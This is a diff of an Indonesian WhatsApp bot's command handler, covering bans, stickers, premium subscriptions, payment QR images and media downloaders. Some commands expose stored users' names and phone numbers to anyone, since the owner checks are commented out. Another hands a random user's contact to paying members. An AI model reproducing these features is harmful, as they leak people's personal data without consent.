+            ahah = `${mentioned[0].split('@')[0]}@s.whatsapp.net`
+            if(cekBannedUser (ahah, ban)) return setReply("Udah di ban kak")     
+            addBanned(nama, calender, ahah, ban)  
+            setReply(`Asik si wawan @${mentioned[0].split('@')[0]} kena banned 🤣`);
+            }
+            break
+                  
+    
+    
+			case 'listban':
+			case 'banlist':
+		//     if (!isOwner) return onlyOwner()
+	          banya = `*List Banned*\nJumlah : ${JSON.parse(fs.readFileSync('./database/banned.json')).length}\n\n`
+			JSON.parse(fs.readFileSync('./database/banned.json')).map(function(e, i){
+			
+            banya += (i+1)+`.🆔 Nama : ${e.name}\n    📲 Nomer : wa.me/${e.id.split("@")[0]}\n    📅 Tanggal : ${e.date}\n\n`            
+        });
+				setReply(banya)
+				break
+            
+            
+            
+            
+            
+			
+
+
+           
+           
+           
+           
+     
+	case 'setfakeimg':
+    if (!dev.key.fromMe && !isOwner) return setReply(mess.only.ownerB)
+        	if ((isMedia && !dev.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
+          	boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
+			delb = await xdev.downloadMediaMessage(boij)
+			fs.writeFileSync(`./stik/fake.jpeg`, delb)
+			setReply(`Berhasil mengubah fake image`)
+        	} else {
+            setReply(`Kirim gambar dengan caption ${prefix}sethumb`)
+          	}
+			break	
+			
+case 'setimagedoc':
+case 'setimgdoc':
+    if (!dev.key.fromMe && !isOwner) return setReply(mess.only.ownerB)
+        	if ((isMedia && !dev.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
+          	boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
+			delb = await xdev.downloadMediaMessage(boij)
+			fs.writeFileSync(`./stik/thumbnaildokumen.jpg`, delb)
+			setReply(`Berhasil mengubah dokumen image`)
+        	} else {
+            setReply(`Kirim gambar dengan caption ${prefix}setimagedoc`)
+          	}
+			break	
+			
+case 'rotate':{
+if (!dev.key.fromMe && !isOwner) return setReply(mess.only.ownerB)
+if (!isQuotedImage) return setReply(`Kirim gambar dengan caption ${prefix+command}`);
+boij = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace("quotedM", "m")).message.extendedTextMessage.contextInfo : dev;
+delb = await xdev.downloadMediaMessage(boij);
+input =  getRandom('.jpg')
+output =  getRandom('.jpg') 
+fs.writeFileSync(`./${input}`, delb);         
+let image = await Jimp.read(`./${input}`)
+   // Checking if any error occurs while rotating image
+await image.rotate(450, function(err){
+    if (err) return setReply(err)
+   })
+   .write(`./${output}`)
+await xdev.sendMessage(from, fs.readFileSync(`./${output}`), image, {quoted: dev, caption: "Nih"})
+await fs.unlinkSync(`./${output}`)
+await fs.unlinkSync(`./${input}`)
+}
+break
+			
+			
+		
+
+			
+			
+			
+			
+		case 'setthumb':
+        if (!dev.key.fromMe && !isOwner) return setReply(mess.only.ownerB)
+        if (((isMedia && !dev.message.videoMessage) || isQuotedImage || isQuotedSticker) && args.length == 0) {
+          boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace("quotedM", "m")).message.extendedTextMessage.contextInfo : dev;
+          delb = await xdev.downloadMediaMessage(boij);
+          fs.writeFileSync(`./stik/thumb.jpeg`, delb);
+          setReply(`Berhasil mengubah thumbnail`)
+        } else {
+          setReply(`Kirim gambar dengan caption ${prefix}sethumb`);
+        }
+        break;
+			
+           
+case 'setovo':
+        if (!dev.key.fromMe && !isOwner) return setReply(mess.only.ownerB)
+        if (((isMedia && !dev.message.videoMessage) || isQuotedImage || isQuotedSticker) && args.length == 0) {
+          boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace("quotedM", "m")).message.extendedTextMessage.contextInfo : dev;
+          delb = await xdev.downloadMediaMessage(boij);
+          fs.writeFileSync(`./kode qr/ovo.jpg`, delb);
+          setReply(`Berhasil mengubah kode qr ovo`)
+        } else if(q){
+          setReply(`Kirim gambar dengan caption ${prefix}setovo`);
+        }
+        break;
+        
+        
+        case 'setgopay':
+        if (!dev.key.fromMe && !isOwner) return setReply(mess.only.ownerB)
+        if (((isMedia && !dev.message.videoMessage) || isQuotedImage || isQuotedSticker) && args.length == 0) {
+          boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace("quotedM", "m")).message.extendedTextMessage.contextInfo : dev;
+          delb = await xdev.downloadMediaMessage(boij);
+          fs.writeFileSync(`./kode qr/gopay.jpg`, delb);
+          setReply(`Berhasil mengubah kode qr gopay`)
+       } else if(q){
+          setReply(`Kirim gambar dengan caption ${prefix}setgopay`);
+        }
+        break;
+           
+           
+       case 'setdana':
+        if (!dev.key.fromMe && !isOwner) return setReply(mess.only.ownerB)
+        if (((isMedia && !dev.message.videoMessage) || isQuotedImage || isQuotedSticker) && args.length == 0) {
+          boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace("quotedM", "m")).message.extendedTextMessage.contextInfo : dev;
+          delb = await xdev.downloadMediaMessage(boij);
+          fs.writeFileSync(`./kode qr/dana.jpg`, delb);
+          setReply(`Berhasil mengubah kode qr dana`)
+        } else if(q){
+          setReply(`Kirim gambar dengan caption ${prefix}setdana`);
+        }
+        break;
+        
+        
+        case 'setimagereply':
+        case 'setimgreply':
+        if (!dev.key.fromMe && !isOwner) return setReply(mess.only.ownerB)
+        if (((isMedia && !dev.message.videoMessage) || isQuotedImage || isQuotedSticker) && args.length == 0) {
+          boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace("quotedM", "m")).message.extendedTextMessage.contextInfo : dev;
+          delb = await xdev.downloadMediaMessage(boij);
+          fs.writeFileSync(`./stik/reply.jpg`, delb);
+          setReply(`Berhasil mengubah image reply`)
+        } else {
+          setReply(`Kirim gambar dengan caption ${prefix}setimagereply`);
+        }
+        break;
+        
+        
+        case 'setimageinfo':
+        case 'setimgenfo':
+        if (!dev.key.fromMe && !isOwner) return setReply(mess.only.ownerB)
+        if (((isMedia && !dev.message.videoMessage) || isQuotedImage || isQuotedSticker) && args.length == 0) {
+          boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace("quotedM", "m")).message.extendedTextMessage.contextInfo : dev;
+          delb = await xdev.downloadMediaMessage(boij);
+          fs.writeFileSync(`./stik/bot.jpg`, delb);
+          setReply(`Berhasil mengubah image pada infobotz`)
+        } else {
+          setReply(`Kirim gambar dengan caption ${prefix}setimageinfo`);
+        }
+        break;
+        
+        
+           
+           
+     case 'addstik':
+		if (!dev.key.fromMe && !isOwner) return reply (mess.only.ownerB)
+				if (!isQuotedSticker) return setReply('Reply stiker nya')
+				
+				if (!q) return setReply('Nama sticker nya apa?')
+				boij = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
+				delb = await xdev.downloadMediaMessage(boij)
+				setiker.push(`${q}`)
+				fs.writeFileSync(`./temp/stick/${q}.webp`, delb)
+				fs.writeFileSync('./temp/stick.json', JSON.stringify(setiker))
+				xdev.sendMessage(from, `Sukses Menambahkan Sticker\nCek dengan cara ${prefix}liststik`, MessageType.text, { quoted: dev})
+				break
+				
+					case 'dellstik':
+					case 'delstik':
+					if(!dev.key.fromMe & !isOwner) return setReply('Only owner')
+					if (!q) return setReply(mess.wrongFormat)
+					try {
+						wanu = imagenye.indexOf(q)
+						setiker.splice(wanu,1)
+						fs.unlinkSync(`./temp/stick/${q}.webp`)
+						fs.writeFileSync('./temp/stick.json', JSON.stringify(setiker))
+						setReply(`Succes delete sticker ${q}!`)
+					} catch (err) {
+						setReply(`Gagal delete sticker ${q}!`)
+					}
+					break
+			
+				
+				
+				
+				
+				
+				
+				
+				case 'addvn':
+				if (!dev.key.fromMe && !isOwner) return reply (mess.only.ownerB)
+				if (!isQuotedAudio) return setReply('Reply vnnya')
+				if (!q) return setReply('Nama audionya apa')
+				boij = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
+				delb = await xdev.downloadMediaMessage(boij)
+				audionye.push(q)
+				fs.writeFileSync(`./temp/audio/${q}.mp3`, delb)
+				fs.writeFileSync('./temp/vn.json', JSON.stringify(audionye))
+				xdev.sendMessage(from, `Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`, MessageType.text, { quoted: dev})
+				break
+				
+				
+				
+				case 'adderror':
+				case 'emror':
+				{
+				if (!q) return setReply(`Yang error apa bro ?\nContoh: ${prefix}adderror nosinya|menu`)
+				if (!dev.key.fromMe && !isOwner) return reply (mess.only.ownerB)
+				oke = q.split("|")[0]
+				oka = q.split("|")[1]
+				addError(oke, oka, listerror)
+				await setReply(`Sukses Menambahkan ${q} ke daftar error`)
+				}
+				break
+				
+				
+			      
+           
+      case 'addbadword':
+                if (!isGroupAdmins && !isOwner)return setReply('hanya admin dan owner')
+                if (args.length < 1) return setReply(`masukkan kata`)
+                if (isKasar(q, badword)) return setReply(`Udah ada`)
+                addBadword(q, badword)
+                setReply(`Sukses`)
+                break
+            case 'delbadword':
+                 if (!isGroupAdmins && !isOwner) return setReply('hanya admin dan owner') 
+                if (args.length < 1) return setReply(`masukkan kata`)
+                if (!isKasar(q, badword)) return setReply(`Ga ada`)
+                delBadword(q, badword)
+                setReply(`Sukses`)
+                break
+            case 'clearbadword':
+                if (!isOwner) return onlyOwner() 
+                if (args.length < 1) return setReply(`tag atau nomor`)
+                if (mentioned.length !== 0){
+                    for (let i = 0; i < mentioned.length; i++){
+                    delCountKasar(mentioned[i], senbadword)
+                    }
+                    setReply('Sukses')
+                } else {
+                    delCountKasar(args[1] + '@s.whatsapp.net', senbadword)
+                    setReply('Sukses')
+                }
+                break
+
+
+
+
+    
+
+    
+
+case 'antichatbot':
+                if (!isOwner) return onlyOwner()
+                if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
+                  if(chatBot === true) return setReply("Udah aktif")
+                    chatBot = true
+					setReply(`Sukses mengaktifkan Antichatbot\nuntuk mengganti teks chatbot ketik ${prefix}tekschat <teks>`)
+                } else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
+                   if(chatBot === false) return setReply("Sudah mati")
+                    chatBot = false
+					setReply(`Berhasil mematikan Antichatbot`)
+                } else if (!q) {
+                      sendButMessage(from, `MODE ANTI CHAT BOT`, `Silahkan pilih salah satu`, [
+                      {buttonId: `${prefix}antichatbot on`, buttonText: {displayText: On },type: 1},
+                      {buttonId: `${prefix}antichatbot off`, buttonText: { displayText: Off },type: 1}]);
+                    }
+                 break;
+                
+
+
+
+
+
+case 'explain':
+                if (!isOwner) return onlyOwner()
+                if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
+                  if(explain) return setReply("Udah aktif")
+                    explain = true
+					setReply(`Sukses mengaktifkan explain silakan cek dengan ketik ${prefix}menu`)
+                } else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
+                   if(!explain) return setReply("Sudah mati")
+                    explain = false
+					setReply(`Berhasil mematikan explain`)
+                } else if (!q) {
+                      sendButMessage(from, `MODE EXPLANATION`, `Silahkan pilih salah satu`, [
+                      {buttonId: `${prefix}explain on`, buttonText: {displayText: On },type: 1},
+                      {buttonId: `${prefix}explain off`, buttonText: { displayText: Off },type: 1}]);
+                    }
+                 break;
+
+
+
+
+
+case 'anticall':
+                if (!isOwner) return onlyOwner()
+                if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
+                  if(Anticall === true) return setReply("Udah aktif")
+                    Anticall = true
+					setReply(`Sukses mengaktifkan Anticall`)
+                } else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
+                   if(Anticall === false) return setReply("Sudah mati")
+                    Anticall = false
+					setReply(`Berhasil mematikan Anticall`)
+                } else if (!q) {
+                      sendButMessage(from, `MODE ANTI CALL`, `Silahkan pilih salah satu`, [
+                      {buttonId: `${prefix}anticall on`, buttonText: {displayText: On },type: 1},
+                      {buttonId: `${prefix}anticall off`, buttonText: { displayText: Off },type: 1}]);
+                    }
+                 break;
+                 
+                 
+   
+
+
+              
+                 
+    
+
+	
+	case 'addsewa':
+	           {
+		      if (!isOwner) return onlyOwner()
+              if (!isGroup)return setReply(mess.only.group)
+              if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
+              if (args.length < 1) return setReply(`Penggunaan :\n*${prefix}addsewa waktu`)       
+             if(_sewa.checkSewaGroup(from, sewa)) return setReply("Grup tersebut masih tersisa waktu sewa")
+             linkgc = await xdev.groupInviteCode(from)
+             yeh = `https://chat.whatsapp.com/${linkgc}`          
+            _sewa.addSewaGroup(from, groupName, yeh, q, sewa)
+             await setReply(`Success`)
+              }
+              break
+              
+              case 'delsewa':
+              {
+              if (!isOwner) return onlyOwner()
+              if (!isGroup)return setReply(mess.only.group)
+              sewa.splice(_sewa.getSewaPosition(from, sewa), 1)
+              fs.writeFileSync('./database/sewa.json', JSON.stringify(sewa))
+              setReply(mess.success)
+              }
+              break
+              
+              
+              
+              
+              
+       case 'sewalist': 
+       case 'listsewa':
+              let txtnyee = `*List Sewa*\nJumlah : ${sewa.length}\n\n`
+              for (let i of sewa){
+              let cekvipp = ms(i.expired - Date.now())
+              txtnyee += `Group : ${i.group}\nID : ${i.id}\nExpire : ${cekvipp.days} hari ${cekvipp.hours} jam ${cekvipp.minutes} menit ${cekvipp.seconds} detik\n\n`             
+               } 
+               txtnyee += `© ${fake1}`
+              setReply(txtnyee)
+              break
+              
+              
+       case 'orderlist': 
+       case 'listorder':
+              if (!isOwner) return onlyOwner()
+              let ordernye = `*List Order*\nJumlah : ${sewa.length}\n\n`
+              for (let i of sewa){
+              let cekvipp = ms(i.expired - Date.now())
+              ordernye += `Group : ${i.group}\nID : ${i.id}\nExpired : ${cekvipp.days} hari ${cekvipp.hours} jam ${cekvipp.minutes} menit ${cekvipp.seconds} detik\nLink : ${i.linkgc}\n\n`             
+               } 
+               ordernye += `© ${fake1}`
+              setReply(ordernye)
+              break
+              
+            case 'listuser':
+			case 'userlist':
+		//     if (!isOwner) return onlyOwner()
+	         let usernye = `*List User*\nJumlah : ${user.length}\n\n`
+			user.map(function(e, i){
+			
+            usernye += (i+1)+`.Nama : ${e.name}\n    Nomer : wa.me/${e.id}\n\n`            
+        });
+				setReply(usernye)
+				break
+				
+case 'dashboard':
+case 'listused':
+ nene = `*List Used Command*\nTotal : ${Dashboard.length}\n\n`
+Dashboard.map(function(e, i){
+nene += (i+1)+`. ${e.name}: ${e.count}\n`            
+ });
+ 
+nenen = [{"buttonId": `${prefix}clearalldb`,"buttonText": {"displayText": `ᴄʟᴇᴀʀ`},"type": "RESPONSE"},
+                    {"buttonId": `DEVELOPER`,"buttonText": {"displayText": `ᴅᴇᴠᴇʟᴏᴘᴇʀ`},"type": "RESPONSE"}]
+sendButLocation(from, nene, `© ${fake1}`, fs.readFileSync('./stik/bot.jpg'), nenen, {contextInfo: forward})             
+break
+              
+             
+         
+    
+              
+      case 'listerror': 
+      case 'errorlist':
+      case 'daftarerror':
+              let errornye = `*List Error*\nJumlah : ${JSON.parse(fs.readFileSync('./database/listerror.json')).length}\n\n`
+              for (let i of JSON.parse(fs.readFileSync('./database/listerror.json'))){          
+              errornye += `Command : ${i.cmd}\n${i.error}\n\n`             
+               } 
+               errornye += `© ${fake1}`
+              setReply(errornye)
+              break
+
+
+	
+	case 'premium':
+	case 'prem':
+	case 'addprem':
+	       if (!isOwner) return onlyOwner()
+if (dev.message.extendedTextMessage === null || dev.message.extendedTextMessage === undefined) {
+if(!q) return setReply(`Penggunaan :\n${prefix}addprem Tag/Reply/input nomer\n\nPilih waktu\ns = detik\nh = jam\nd =hari\n\nContoh: ${prefix}addprem +62xxx 1h`)       
+if (args[0].startsWith('08')) return setReply('Awali nomor dengan 62')  
+if(args.length > 2 ) return setReply(`Format salah, ketik ${prefix}addprem 62851xxx 1h Gitu tod`)
+if(args.length < 2 ) return setReply(`Format salah, ketik ${prefix}addprem 62851xxx 1h Gitu tod`)
+nomor = args[0] + `@s.whatsapp.net`              
+if(_prem.checkPremiumUser (nomor, premium)) return setReply("User tersebut sudah di premium kak")   
+_prem.addPremiumUser (nomor, args[1], premium)         
+await setReply(`Succes add premium ${nomor}`)
+await sendButMessage(nomor, `HALO KAK AKU *${fake}*\nkamu telah terdaftar sabagai user premium\nterimakasih sudah menggunakan ${fake}`, `Silahkan pilih salah satu`, [
+                      {buttonId: `${prefix}cekprem`, buttonText: {displayText: `ᴄᴇᴋ ᴘʀᴇᴍ`,},type: 1},
+                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
+    
+} else if (dev.message.extendedTextMessage.contextInfo.participant) {
+premnih = dev.message.extendedTextMessage.contextInfo.participant
+if (!isGroup) return setReply("Hanya bisa di group")
+if(args.length < 1) return setReply(`Penggunaan :\n${prefix}addprem\n\nPilih waktu\ns = detik\nh = jam\nd =hari`)      
+ if(_prem.checkPremiumUser (premnih, premium)) return setReply("User tersebut sudah di premium kak")   
+_prem.addPremiumUser (premnih, q, premium)         
+ await setReply(`Succes add premium ${premnih.split("@")[0]}`)
+await sendButMessage(premnih, `HALO KAK AKU *${fake}*\nkamu telah terdaftar sabagai user premium\nterimakasih sudah menggunakan ${fake}`, `Silahkan pilih salah satu`, [
+                      {buttonId: `${prefix}cekprem`, buttonText: {displayText: `ᴄᴇᴋ ᴘʀᴇᴍ`,},type: 1},
+                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
+    
+ } else if(dev.message.extendedTextMessage.contextInfo.mentionedJid.length == 1) { 
+mentioned = dev.message.extendedTextMessage.contextInfo.mentionedJid;
+if (mentioned.length > 1) return setReply(`Satu satu dong`)
+if(args.length < 2) return setReply(`Penggunaan :\n${prefix}addprem\n\nPilih waktu\ns = detik\nh = jam\nd =hari`)       
+lulu =`${mentioned[0].split('@')[0]}@s.whatsapp.net`
+ if(_prem.checkPremiumUser (lulu, premium)) return setReply("User tersebut sudah di premium kak")   
+_prem.addPremiumUser (lulu, args[1], premium)         
+await setReply(`Succses, silakan ketik ${prefix}listprem untuk melihat list premium`)
+await sendButMessage(lulu, `HALO KAK AKU *${fake}*\nkamu telah terdaftar sabagai user premium\nterimakasih sudah menggunakan ${fake}`, `Silahkan pilih salah satu`, [
+                      {buttonId: `${prefix}cekprem`, buttonText: {displayText: `ᴄᴇᴋ ᴘʀᴇᴍ`,},type: 1},
+                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
+   } else{
+ setReply(`Kirim perintah ${prefix}addprem @tag atau nomor atau reply pesan orang yang ingin di addprem`)
+ }
+break    
+	
+	
+	
+  
+         
+case 'delprem':
+case 'delpremium':
+       if (!isOwner) return onlyOwner()
+if (dev.message.extendedTextMessage === null || dev.message.extendedTextMessage === undefined) {
+if(!q) return setReply("Penggunaan : delprem Tag/Reply/Input nomer target yang mau di jadikan premium")
+if (args[0].includes('08')) return setReply('Awali nomor dengan 62')  
+if(args[3]) return setReply(`Format salah, ketik ${prefix}delprem 62851xxx  Gitu tod`)
+nomor = args[0] + `@s.whatsapp.net` 
+if(!_prem.checkPremiumUser (nomor, premium)) return setReply("Maap kak user tersebut tidak ada di database")   
+          _prem.delPremiumUser (nomor, premium)
+          return setReply(`Succes delete premium ${nomor}`)
+          
+ } else if (dev.message.extendedTextMessage.contextInfo.participant) {
+if (!isGroup) return setReply("Hanya bisa di group")
+premnih = dev.message.extendedTextMessage.contextInfo.participant
+if(args.length > 0) return setReply("Format salah")
+if(!_prem.checkPremiumUser (premnih, premium)) return setReply("Maap kak user tersebut tidak ada di database")   
+ _prem.delPremiumUser (premnih, premium) 
+  await setReply(`Succes delete premium  ${premnih.split("@")[0]}`)
+  
+} else if(dev.message.extendedTextMessage.contextInfo.mentionedJid) { 
+mentioned = dev.message.extendedTextMessage.contextInfo.mentionedJid;
+if(mentioned.length > 1) return setReply("Satu satu kak")
+	lulu = `${mentioned[0].split('@')[0]}@s.whatsapp.net`
+	if(!_prem.checkPremiumUser (lulu, premium)) return setReply("Maap kak user tersebut tidak ada di database")   
+_prem.delPremiumUser (lulu, premium) 
+await setReply(`Succses, silakan ketik ${prefix}listprem untuk melihat list premium`)
+ }
+break    
+	
+          
+          
+                 
+
+
+ 
+                  
+                  
+         
+	
+	
+	
+	
+	
+	case 'addstatus':
+	case 'addstory':
+					if (!isOwner && !dev.key.fromMe) return onlyOwner()
+					if (args.length < 1) return setReply('Teksnya?')
+					if (isMedia && !dev.message.videoMessage || isQuotedImage) {
+						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
+						buff = await xdev.downloadMediaMessage(encmedia)
+							await xdev.sendMessage('status@broadcast', buff, image, {caption: `${q}`})
+						await setReply(`Sukses mengirim up status image ${q}`)
+						} else if (isMedia && !dev.message.videoMessage || isQuotedVideo) {
+						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
+						buff = await xdev.downloadMediaMessage(encmedia)
+							await xdev.sendMessage('status@broadcast', buff, video, {caption: `${q}`})
+						setReply(`Sukses mengirim up status video ${q}`)
+						} else {
+							await xdev.sendMessage('status@broadcast', `*${q}`,text)
+						await sendMess(`Sukses mengirim status:\n${q}`)
+					}
+					break
+					
+	
+	
+//-------------------------------》FITUR PREMIUM《-------------------------------\\       
+	
+	
+case 'cariteman':
+case 'caridoi':
+if (!isPremium && !isOwner && !dev.key.fromMe) return setReply(`Kamu bukan user premium`)
+	//const namanya = xdev.contacts[teman] != undefined ? xdev.contacts[teman].vname || xdev.contacts[teman].notify : undefined
+	          
+ teman = user[Math.floor(Math.random() * user.length)]
+ namaTeman = teman.name
+ nomerTeman = teman.id
+	setTimeout( () => {
+                    setReply("Sedang mencari....")
+                    },1000)  
+	setTimeout( () => {
+                    setReply("Berhasil mendapatkan satu doi")
+                    },5000)  
+    setTimeout( () => {           
+    sendKontak(from, `${nomerTeman}`, namaTeman, "Sibuk");
+                    },9000)  
+    break
+	
+	
+	
+	
+	
+	
+	case 'chat':
+	if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
+           if (args.length < 1) return setReply(`Penggunaan ${prefix}chat 62xnxx|teks`)
+			if (args[0].startsWith('08')) return setReply('Awali nomor dengan 62') 
+            var nomor = q.split("|")[0].replace(new RegExp("[()+-/ +/]", "gi"), "") 
+            var org = q.split("|")[1];
+            xdev.sendMessage(nomor+'@s.whatsapp.net', org, MessageType.text)   
+            setReply(`Sukses mengirim chat:\n${org} ke nomer ${nomor}`)
+            break
+	
+	
+//-----------------------------------] Menu Download [-----------------------------------//
+	
+/*
+    otakudesu,
+	covid,
+	ongoing,
+	komiku,✓
+	tebakgambar,
+	surah,
+	sholat,
+	lirik,
+	chara,✓
+	wattpad,
+	playstore,✓
+	linkwa,✓
+	pinterest,✓
+	igdl,✓
+	igstory,✓
+	igstalk,✓
+	twitter,✓
+	fbdown,✓
+	youtube,
+	ttdownloader✓
+         -ttaudio
+         -ttwm✓
+         -ttnowm✓
+*/
+
+case 'igstalk':
+try{
+if (!q) return setReply('Usernamenya?')
+ig.fetchUser(`${q}`).then(Y => {
+console.log(Y)
+ten = `${Y.hd_profile_pic_url_info.url}`
+teks = `*ID* : ${Y.id}\n*Username* : ${args.join('')}\n*Full Name* : ${Y.fullname}\n*Bio* : ${Y.biography}\n*Followers* : ${Y.followers}\n*Following* : ${Y.following}\n*Private* : ${Y.is_private}\n*Verified* : ${Y.is_verified}\n\n*Link* : https://instagram.com/${args.join('')}`
+sendMediaURL(from,ten,teks) 
+})} catch (err){
+console.log(err)
+setReply("Aduh error om")
+}
+break;      
+
+
+
+
+case 'twmp4': case 'twitter':
+if (args.length < 1) return setReply('Link?')
+lin = args[0]
+setReply(mess.wait)
+hx.twitter(lin).then(res => {
+console.log('[ TWITTER ] downloader')
+Anu = res.SD
+sendFileFromUrl(Anu, video, {quoted: dev, caption: 'Done!'})
+})
+break
+
+
+case 'twmp4hd':
+case 'twitterhd':
+  if (!isPremium && !isOwner && !dev.key.fromMe) return setReply(`Kamu bukan user premium`)
+if (args.length < 1) return setReply('Link?')
+lin = args[0]
+setReply(mess.wait)
+hx.twitter(lin).then(res => {
+console.log('[ TWITTER ] downloader')
+Anu = res.HD
+fotonya = res.thumb
+//fto =  await getBuffer(fotonya)
+//xdev.sendMessage(from, fto, image, {quoted:dev, caption:`*TWITTER MP4*\n\n•> Hd : ${res.HD}\n•> Sd : ${res.SD}\n•> Audio : ${res.audio}\n\n_Please wait, the media file is being sent it may take a few minutes_`, thumbnail: fto, contextInfo:forward})
+sendFileFromUrl(Anu, video, {quoted: dev, caption: 'Done!'})
+})
+break
+
+
+
+
+
+          
+
+
+case 'pinterest':
+try{
+if (!isPremium && !isOwner) return setReply(mess.only.prem)
+if(!q) return setReply('gambar apa?')
+setReply(mess.wait)
+let pin = await hx.pinterest(q)
+let ac = pin[Math.floor(Math.random() * pin.length)]
+let di = await getBuffer(ac)
+await xdev.sendMessage(from,di,image,{quoted: dev})
+ } catch (err){
+console.log(err)
+return setReply("Yah ga ketemu, coba lagi dong ^_^ ")
+}
+break
+	
+	
+case 'wallpaper':
+wallpaperv2(q).then(async (data) => {
+console.log(data)
+foto = data[Math.floor(Math.random() * data.length)]
+ await sendFileFromUrl(foto, image, {quoted: dev, caption: "Nih"})
+})
+break
+	
+case 'gimage':
+case 'googleimage':
+case 'image':
+if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
+if (args.length < 1) return setReply('Apa Yang Mau Dicari?')
+try{
+googleImage(q).then(async (data) => {
+//console.log(data)
+foto = data[Math.floor(Math.random() * data.length)]
+if(data.length == "0") return setReply("Image tidak di temukan")
+setReply(mess.wait)
+await sendFileFromUrl(foto, image, {quoted: dev, caption: "Nih"})
+})
+} catch(err){
+teks = args.join(' ')
+res = await gis(teks, google)
+function google(error, result){
+if (error){ return setReply('_[ ! ] Error Terjari Kesalahan Atau Hasil Tidak Ditemukan_')}
+else {
+var gugIm = result
+var random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
+sendFileFromUrl(random, image, {quoted: dev, caption: `*Hasil Pencarian Dari :* ${teks}`})
+}
+}
+}
+limitAdd(senderNumber, user)
+break
+
+
+case 'igstory': 
+if(!q) return setReply('Usernamenya?')      
+Download.insta_story(q).then(async (data) => {
+console.log(data)
+for(let i of data.stories){
+if(i.type == 'photo'){
+await sendFileFromUrl(i.url, image, {quoted: dev, caption: "Nih"})
+} else if(i.type == 'video'){
+await sendFileFromUrl(i.url, video, {quoted: dev, caption: "Nih"})
+ }
+ }
+})
+break
+           
+
+	
+	case 'linkwa':{
+            if(!q) return setReply('cari group apa?')
+            hx.linkwa(q)
+            .then(result => {
+            let res = '*「 _LINK WA_ 」*\n\n'
+            for (let i of result) {
+            res += `*Nama*: *${i.nama}\n*Link*: ${i.link}\n\n`
+            }
+            setReply(res)
+            });
+            }
+            break
+  
+            
+            
+            
+            
+            
+            
+            
+            
+            
+            case 'tiktok':        
+                     if (args.length < 1) return setReply('Link?')
+                     if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return setReply("Error link")
+                     if(q.startsWith("https://vt.tiktok.com/")){
+                     var lin = args[0]
+                     } else if(q.startsWith("https://vm.tiktok.com/")){
+                     var lin = args[0]
+                     } else if(q.startsWith("https://www.tiktok.com/")){
+                     var lin = args[0]
+                     } else {
+                     return setReply("Masukan link tikok, contoh https://vt.tiktok.com/")
+                     }
+                     setReply(mess.wait)
+                     hx.ttdownloader(lin).then(res => {
+                     console.log('[ T I K T O K ] downloader')
+                     ep = res.wm                     
+                     sendFileFromUrl(ep, video, {quoted: dev, caption: "Nih"})
+                      })
+                      break
+                      
+                               
+                     case 'tiktoknowm':     
+                     try{   
+                     if (args.length < 1) return setReply('Link?')
+                     if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return setReply(aml.Iv)
+                     if(q.startsWith("https://vt.tiktok.com/")){
+                     var lin = args[0]
+                     } else if(q.startsWith("https://vm.tiktok.com/")){
+                     var lin = args[0]
+                     } else if(q.startsWith("https://www.tiktok.com/")){
+                     var lin = args[0]
+                     } else {
+                     return setReply("Masukan link tikok, contoh https://vt.tiktok.com/")
+                     }
+                     setReply(mess.wait)
+                     hx.ttdownloader(lin).then(res => {
+                     console.log('[ T I K T O K ] downloader')
+                     ep = res.nowm                     
+                     sendFileFromUrl(ep, video, {quoted: dev, caption: "Nih"})
+                      })
+                      } catch (err){
+                      	setReply(`${err}`)
+                      }
+                      break
+                      
+                      
+	
+case 'ig':
+setReply(mess.wait)
+if (!q) return setReply('Linknya?')
+igreel = q.includes("https://www.instagram.com/reel/")
+
+if(igreel){
+Download.insta_reel(q).then(async (data) => {
+sendFileFromUrl(`${data.url}`, video, {quoted: dev, caption: `Nih`})
+console.log(data)
+console.log(data.url)
+})
+} else {
+var { igDownloader } = require('./lib/igdown')
+res = await igDownloader(`${q}`).catch(e => {
+return setReply(mess.error.api)
+})
+console.log(res)
+sendMediaURL (from, res.result.link, res.result.desc) 
+}
+break
+                   
+                   
+
+   
+  
+
+        
+	
+    
+	                                                                                    
+            
+    case 'totag':
+    if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
